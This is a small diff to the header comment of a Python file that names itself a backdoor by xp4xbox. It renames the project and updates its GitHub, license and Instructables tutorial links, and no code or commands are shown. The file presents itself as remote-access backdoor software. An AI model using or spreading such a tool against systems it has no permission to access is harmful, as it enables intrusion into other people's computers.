@@ -1,7 +1,8 @@
 '''
-Simple python backdoor by xp4xbox
+Python backdoor by xp4xbox
+https://github.com/xp4xbox/Python-Backdoor
 https://www.instructables.com/id/Simple-Python-Backdoor/
-License: https://github.com/xp4xbox/Simple-Python-Backdoor/blob/master/LICENSE
+License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 
 Client Requires:
 
